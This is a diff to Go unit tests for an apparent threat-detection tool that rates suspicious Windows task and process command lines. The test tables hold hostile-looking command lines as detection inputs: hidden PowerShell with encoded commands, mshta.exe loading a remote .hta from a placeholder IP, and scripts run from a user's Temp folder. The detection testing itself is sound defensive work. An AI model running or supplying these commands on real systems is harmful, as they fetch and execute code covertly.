@@ -77,6 +77,8 @@ func TestTaskConfigurationSelectsActionEvidence(t *testing.T) {
 		{"nested encoded action", "cmd.exe", `cmd.exe /c powershell.exe -w hidden -enc AAAA`, model.SeverityHigh, model.ConfidenceMedium},
 		{"unknown encoded", "powershell.exe", `powershell.exe -enc AAAA`, model.SeverityMedium, model.ConfidenceMedium},
 		{"remote action", "mshta.exe", `C:\Windows\System32\mshta.exe https://203.0.113.8/a.hta`, model.SeverityHigh, model.ConfidenceMedium},
+		{"hidden command data argument", "powershell.exe", `powershell.exe -w hidden -Command Read-Config -File C:\Users\alice\AppData\Local\Temp\data.json`, model.SeverityMedium, model.ConfidenceMedium},
+		{"hidden script data argument", "powershell.exe", `powershell.exe -w hidden -File C:\Tools\daily.ps1 -File C:\Users\alice\AppData\Local\Temp\data.json`, model.SeverityMedium, model.ConfidenceMedium},
 		{"writable script hidden", "powershell.exe", `powershell.exe -w hidden -File C:\Users\alice\AppData\Local\Temp\job.ps1`, model.SeverityHigh, model.ConfidenceMedium},
 		{"writable executable", "job.exe", `C:\Users\alice\AppData\Local\Temp\job.exe`, model.SeverityMedium, model.ConfidenceLow},
 	}
@@ -175,7 +177,7 @@ func TestInvocationCatalogReflectsEvidenceLevels(t *testing.T) {
 }
 
 func TestInterpreterNestingRequiresIndependentEvidence(t *testing.T) {
-	for _, pair := range [][2]string{{"cmd.exe", "cmd.exe"}, {"powershell.exe", "powershell.exe"}} {
+	for _, pair := range [][2]string{{"cmd.exe", "cmd.exe"}, {"powershell.exe", "powershell.exe"}, {"powershell.exe", "pwsh.exe"}} {
 		e := model.Event{ID: "e", CaseID: "c", Host: "host01", User: "alice", EventType: model.EventProcessCreate, ParentProcessName: pair[0], ProcessName: pair[1], ProcessPath: `C:\Users\alice\AppData\Local\Temp\` + pair[1]}
 		if got := (suspiciousProcessChain{}).Evaluate([]model.Event{e}); len(got) != 0 {
 			t.Fatalf("nesting and writable path alone produced %d findings", len(got))
